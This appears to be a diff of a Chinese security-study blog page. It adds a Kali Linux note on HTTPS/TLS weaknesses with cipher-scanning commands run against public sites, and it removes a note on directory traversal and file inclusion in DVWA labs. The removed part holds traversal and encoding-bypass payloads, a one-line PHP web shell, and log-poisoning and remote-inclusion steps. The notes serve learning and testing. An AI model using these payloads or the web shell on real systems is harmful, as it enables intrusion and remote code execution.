@@ -240,6 +240,367 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/22/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%BA%94)%EF%BC%9AHttps%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/22/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%BA%94)%EF%BC%9AHttps%E6%94%BB%E5%87%BB/" itemprop="url">Kali Linux笔记(五十五)：Https攻击</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-22T23:54:59+08:00">
+                2020-01-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.2k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  4 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-HTTPS攻击"><a href="#1-HTTPS攻击" class="headerlink" title="1. HTTPS攻击"></a>1. HTTPS攻击</h4><ul>
+<li>全站HTTPS正成为潮流趋势<ul>
+<li>淘宝、百度</li>
+</ul>
+</li>
+<li>HTTPS的作用<ul>
+<li>CIA</li>
+<li>解决的是信息传输过程中数据被篡改、窃取</li>
+<li>加密：对称、非对称、单向(hash计算)</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐CIA
+C：机密性（Confidentiality）指只有授权用户可以获取信息。
+I：完整性（Integrity）指信息在输入和传输的过程中，不被非法授权修改和破坏，保证数据的一致性。
+A：可用性（Availability）指保证合法用户对信息和资源的使用不会被不正当地拒绝。</code></pre></blockquote>
+<ul>
+<li>HTTPS攻击方法<ul>
+<li>降级攻击（高强度加密算法的降级攻击）</li>
+<li>解密攻击（明文、证书伪造）</li>
+<li>协议漏洞、实现方法的漏洞、配置不严格</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-Secure-socket-layer"><a href="#2-Secure-socket-layer" class="headerlink" title="2. Secure socket layer"></a>2. Secure socket layer</h4><ul>
+<li>保证网络通信安全的加密协议</li>
+<li>1994年由Netscape开发成为统一标准</li>
+<li>1999年TLS（transport layer security）取代SSL v3</li>
+<li>近年来发现的SSL协议漏洞使业界认为其漏洞已不可软件修复<ul>
+<li>Heartbleed</li>
+<li>POODLE</li>
+<li>BEAST</li>
+</ul>
+</li>
+<li>TLS当前最新版本1.2</li>
+<li>TLS/SSL、HTTPS、HTTP over SSL通俗上表示同意含义</li>
+<li>SSL/TLS也被用于其他场景的传输通道加密<ul>
+<li>邮件传输（服务器间、客户端与服务期间,SMTP/POP3为明文协议）</li>
+<li>数据库服务器间</li>
+<li>LDAP身份认证服务器</li>
+<li>SSL VPN</li>
+<li>远程桌面RDP通信过程中的加密和身份认证</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-SSL加密"><a href="#3-SSL加密" class="headerlink" title="3. SSL加密"></a>3. SSL加密</h4><ul>
+<li>WEB通信中的SSL加密（PKI体系架构）<ul>
+<li>公钥证书（受信任的第三方证书颁发机构签名颁发）</li>
+<li>VeriSign</li>
+<li>Thawte</li>
+<li>GlobalSign</li>
+<li>Symantec</li>
+</ul>
+</li>
+<li>加密过程<ul>
+<li>握手、协商加密算法、获取公钥证书、验证公钥证书、交换会话密钥、加密信息传输</li>
+<li>加密套件（Cipher Suite：对称加密+非对称加密+单向加密+密钥算法）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐加密信息传输过程（哈希值用于数据传输的完整性）
+1.用交换的对称密钥对明文进行加密
+2.对加密的明文进行哈希计算，得出一串额外的字符串
+3.对字符串进行服务器私钥加密
+▲ 存在疑问4.加密过程中，将对称密码加密的明文+哈希值+加密后的哈希值一起传给对方
+⭐加密信息解密过程
+1.用服务器公钥对哈希值进行解密，得出哈希值H2
+2.用交换的对称密钥对对称密钥加密的字段进行解密，并计算哈希值H1
+3.比对哈希值H1和H2的值是否相等，保证了数据的完整性和身份认证</code></pre></blockquote>
+<h4 id="4-加密算法"><a href="#4-加密算法" class="headerlink" title="4. 加密算法"></a>4. 加密算法</h4><ul>
+<li>非对称加密算法<ul>
+<li>Diffie-Hellman Key exchange（密钥交换）</li>
+<li>Rivest Shamir Adleman（RSA）</li>
+<li>Elliptic Curve Cryptography（ECC）</li>
+</ul>
+</li>
+<li>对称加密算法<ul>
+<li>Data Encryption Standard（DES/3DES）</li>
+<li>Advance Encryption Standard（AES）</li>
+<li>International Data Encryption Algorithm（IDEA）</li>
+<li>Rivest Cipher 4（RC4）<ul>
+<li>WEP、TLS/SSL、RDP、Secure shell</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>单向加密算法（hash算法）<ul>
+<li>SHA-3已经设计完成，但尚未广泛使用</li>
+<li>SHA-2是TLS1.2唯一支持的单向加密算法</li>
+<li>碰撞攻击针对单向加密算法<ul>
+<li>两个不同的文件生成相同的HASH值</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center">HASH算法</th>
+<th align="center">HASH值长度（bit）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">MD5</td>
+<td align="center">128</td>
+</tr>
+<tr>
+<td align="center">SHA-1</td>
+<td align="center">160</td>
+</tr>
+<tr>
+<td align="center">SHA-2</td>
+<td align="center">224、256、384、512</td>
+</tr>
+</tbody></table>
+<h4 id="5-SSL的弱点"><a href="#5-SSL的弱点" class="headerlink" title="5. SSL的弱点"></a>5. SSL的弱点</h4><ul>
+<li>SSL是不同的对称、非对称、单向加密算法的组合加密实现（cipher suite）</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center">加密算法</th>
+<th align="center">SSL实现中的用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">RAS/Diffie-Hellman</td>
+<td align="center">密钥交换、身份认证</td>
+</tr>
+<tr>
+<td align="center">AES</td>
+<td align="center">加密数据，由RAS/DH完成密钥交换</td>
+</tr>
+<tr>
+<td align="center">HMAC-SHA2</td>
+<td align="center">摘要信息</td>
+</tr>
+</tbody></table>
+<ul>
+<li>服务器端为提供更好的兼容性，选择支持大量过时的cipher suite</li>
+<li>协商过程中强迫降级加密强度</li>
+<li>现代处理器计算能力可以在可接受的时间内破解时加密算法</li>
+<li>购买云计算资源破解</li>
+</ul>
+<h4 id="6-Openssl"><a href="#6-Openssl" class="headerlink" title="6. Openssl"></a>6. Openssl</h4><ul>
+<li>直接调用openssl库识别目标服务器支持的SSL/TLS cipher suite</li>
+<li><strong><code>🔺命令：openssl s_client -connect www.baidu.com:443</code></strong></li>
+<li><strong><code>🔺命令：openssl s_client -tls1_2 -cipher &#39;ECDH-RSA-RC4-SHA&#39; -connect www.taobao.com:443</code></strong> ▲ 2020.1.22 SSL routines:SSL_CTX_set_cipher_list:no cipher match<ul>
+<li>▲ 密钥交换–身份认证–数据加密–HASH算法</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：openssl s_client -tls1_2 -cipher &quot;NULL,EXPORT,LOW,DES&quot; -connect www.taobao.com:443</code></strong>（协商低安全级别cipher suite）</li>
+<li>可被破解的cipher suite<ul>
+<li><strong><code>🔺命令：openssl ciphers -v &quot;NULL,EXPORT,LOW,DES&quot;</code></strong></li>
+</ul>
+</li>
+<li><a href="https://www.openssl.org/docs/apps/ciphers.html" target="_blank" rel="noopener">https://www.openssl.org/docs/apps/ciphers.html</a> （cipher suite的组合）</li>
+<li>Openssl需要大量的密码学相关知识，命令复杂，结果可读性差</li>
+</ul>
+<h4 id="7-SSLScan"><a href="#7-SSLScan" class="headerlink" title="7. SSLScan"></a>7. SSLScan</h4><ul>
+<li>自动识别SSL配置错误、过期协议、过时cipher suite和hash算法</li>
+<li>默认会检查新浪CRIME、heartbleed漏洞</li>
+<li>TLS支持的cipher suite<ul>
+<li><strong><code>🔺命令：sslscan --tlsall www.taobao.com:443</code></strong></li>
+</ul>
+</li>
+<li>分析证书详细数据<ul>
+<li><strong><code>🔺命令：sslscan --show-certificate --no-ciphersuites www.taobao.com:443</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="8-SSLyze"><a href="#8-SSLyze" class="headerlink" title="8. SSLyze"></a>8. SSLyze</h4><ul>
+<li>Python语言编写</li>
+<li>检查SSL过时版本</li>
+<li>检查存在弱点的cipher suite</li>
+<li>扫描多站点时，支持来源文件</li>
+<li>检查是否支持会话恢复</li>
+<li><strong><code>🔺命令：sslyze --regular www.baidu.com:443</code></strong></li>
+</ul>
+<h4 id="9-Nmap"><a href="#9-Nmap" class="headerlink" title="9. Nmap"></a>9. Nmap</h4><ul>
+<li><strong><code>🔺命令：nmap --script=ssl-enum-ciphers.nse www.taobao.com</code></strong></li>
+</ul>
+<h4 id="10-QUALYS-SSL-LABS"><a href="#10-QUALYS-SSL-LABS" class="headerlink" title="10. QUALYS SSL LABS"></a>10. QUALYS SSL LABS</h4><ul>
+<li><a href="https://www.sslabs.com/ssltest/" target="_blank" rel="noopener">https://www.sslabs.com/ssltest/</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/21/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%9B%9B)%EF%BC%9AWebShell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2908,325 +3269,11 @@ Host：123
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AD)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AD)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" itemprop="url">Kali Linux笔记(四十六)：手动漏洞挖掘--目录遍历、文件包含</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-08T16:06:25+08:00">
-                2020-01-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  874 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  3 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-手动漏洞挖掘–目录遍历-文件包含"><a href="#1-手动漏洞挖掘–目录遍历-文件包含" class="headerlink" title="1. 手动漏洞挖掘–目录遍历/文件包含"></a>1. 手动漏洞挖掘–目录遍历/文件包含</h4><ul>
-<li>Directory traversal/File include（有区别/没区别）<ul>
-<li>目录权限限制不严/文件包含</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐区别:
-目录遍历：操作系统内部文件
-文件包含：1.LFI包含本地文件include 
-         2.RFI远程文件包含include（php的include函数）
-▲ Directory Browser和Directory traversal/pass不同</code></pre></blockquote>
-<ul>
-<li>修改Metasploitable的配置文件，使Metasploitable出现远程文件包含漏洞<ul>
-<li><strong><code>🔺命令：sudo vi /etc/php5/cgi/php.ini</code></strong></li>
-<li>allow_url_include=On</li>
-<li><strong><code>🔺命令：sudo /etc/init.d/apache2 restart</code></strong></li>
-</ul>
-</li>
-<li>应用程序功能操作文件，限制不严时导致访问WEB目录以外的文件<ul>
-<li>读、写文件、远程执行代码</li>
-</ul>
-</li>
-<li>特征但不绝对<ul>
-<li>?page=a.php</li>
-<li>?home=b.html</li>
-<li>?file=content</li>
-</ul>
-</li>
-<li>经典测试方法<ul>
-<li>?file=../../../../../../../../etc/passwd</li>
-<li>?page=file:///etc/passwd（文件包含的话，可以直接填写绝对路径）</li>
-<li>?home=main.cgi</li>
-<li>?page=<a href="http://www.a.com/1.php（远程文件包含）" target="_blank" rel="noopener">http://www.a.com/1.php（远程文件包含）</a></li>
-<li><a href="http://1.1.1.1/../../../../../dir/file.txt" target="_blank" rel="noopener">http://1.1.1.1/../../../../../dir/file.txt</a></li>
-</ul>
-</li>
-<li>编码绕过字符过滤<ul>
-<li>“.” “%00”–空字符（绕过文件扩展名过滤）</li>
-<li>?file=a.doc%00.php</li>
-<li>使用多种编码尝试</li>
-</ul>
-</li>
-<li>不同操作系统的路径特征字符<ul>
-<li>类Unix系统（根目录:/  目录层级分隔符:/）</li>
-<li>Windows系统（C:/  \或/）</li>
-</ul>
-</li>
-<li>URL编码、双层URL编码<ul>
-<li>%2e%2e%2f        解码：../</li>
-<li>%2e%2e%5c        解码：..\</li>
-<li>%252e%252e%255c  解码：..\（双层编码，%25解码后为%）</li>
-</ul>
-</li>
-<li>Unicode/UTF-8编码<ul>
-<li>..%c0%af         解码：../</li>
-<li>..%u2216</li>
-<li>..%c1%9c         解码：..\</li>
-</ul>
-</li>
-<li>其他系统路径可能使用到的字符<ul>
-<li>file.txt…</li>
-<li>file.txt<spaces></li>
-<li>file.txt````````</li>
-<li>file.txt&lt;&lt;&lt;&gt;&gt;&gt;</li>
-<li>./././file.txt</li>
-<li>nonexistant/../file.txt（不存在的目录）</li>
-</ul>
-</li>
-<li>UNC路径（文件共享路径）<ul>
-<li>\1.1.1.1\path\to\file.txt</li>
-</ul>
-</li>
-<li>本地文件抱哈LFI（一般很难代码执行）<ul>
-<li>查看文件</li>
-<li>代码执行</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐LFI的代码执行
-1.Kali开启nc侦听80端口（目标主机），发送&lt;?php echo shell_exec($_GET[&apos;cmd&apos;]);?&gt;
-2.可查看/var/log/apache2/access.log中有记录（服务器apache2日志文件）
-3.查看access.log文件www-data用户是否可以进行执行修改
-4.chmod a+rx access.log（若www-data无权限，假设可修改文件属性）
-5.chmod a+xr apache2（若www-data无权限，假设可修改文件属性）
-6.ls -ld查看权限，保证上级上上级可被www-data执行
-7.?page=/var/log/apache2/access.log（LFI本地文件包含）</code></pre></blockquote>
-<ul>
-<li>远程文件执行RFI<ul>
-<li>出现概率少于LFI，但更容易被利用</li>
-<li>测试 </li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐测试远程文件包含
-1.kali本地侦听80端口（本机端口）
-2.Web page页?page=http://Kali 地址/a.php（不存在的php页面）
-3.若kali收到请求，则表示测试成功
-⭐远程文件包含
-1.Kali机子上vi 1.txt
-2.&lt;?php echo shell_exec($_GET[&apos;cmd&apos;]);?&gt;
-3.Kali机子上service apache2 start（存放在/var/www/html/）
-4.DVWA访问?page=http://kali ip地址/1.txt&amp;cmd=pwd</code></pre></blockquote>
-<ul>
-<li>DVWA的File Inclusion（low）</li>
-<li>多种绕过方法</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&apos;page&apos;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>DVWA的File Inclusion（mediaum）</li>
-<li>绕过方法:ht<a href="http://tp://dvwa/" target="_blank" rel="noopener">http://tp://dvwa/</a>….</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&apos;page&apos;];</span><br><span class="line"></span><br><span class="line">    $file = str_replace(&quot;http://&quot;,&quot;&quot;,$file);</span><br><span class="line">    $file = str_replace(&quot;https://&quot;,&quot;&quot;,$file);</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>DVWA的File Inclusion（high）</li>
-<li>暂无绕过方法</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&apos;page&apos;];</span><br><span class="line"></span><br><span class="line">    if($file!=&quot;include.php&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;ERROR:File not found!&quot;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>/usr/share/wfuzz/wordlist/vulns/（Kali集成攻击向量字典）</li>
-</ul>
-<h4 id="2-手动漏洞挖掘–Cookie存在漏洞"><a href="#2-手动漏洞挖掘–Cookie存在漏洞" class="headerlink" title="2. 手动漏洞挖掘–Cookie存在漏洞"></a>2. 手动漏洞挖掘–Cookie存在漏洞</h4><ul>
-<li>代码</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$template = &apos;blue.php&apos;</span><br><span class="line">if( is_set($_COOKIE[&apos;TEMPLATE&apos;]))</span><br><span class="line">    $template = $_COOKIE[&apos;TEMPLATE&apos;]</span><br><span class="line">include (&quot;/home/users/phpguru/template/&quot;.$template)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>攻击</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /vulnerable.php HTTP/1.0</span><br><span class="line">Cookie:TEMPLATE=../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>结果</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content=Type:text/html</span><br><span class="line">Server:Apache</span><br><span class="line"></span><br><span class="line">root:fi3sED95ibqR6:0:1:System Operator:/:/bin/ksh</span><br><span class="line">daemon:*:1:1::/tmp:</span><br><span class="line">phpguru:f8fk3j1oIf31.:182:100:Developer:/home/users/phpguru/:bin/csh</span><br></pre></td></tr></table></figure>
-
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/3/">Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/5/">Next</a>
+    <a class="extend prev" rel="prev" href="/page/3/">Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/5/">Next</a>
   </nav>
 
 
@@ -3276,7 +3323,7 @@ Host：123
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">90</span>
+                  <span class="site-state-item-count">91</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3383,7 +3430,7 @@ Host：123
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">90.4k</span>
+    <span title="Site words total count">91k</span>
   
 </div>
 
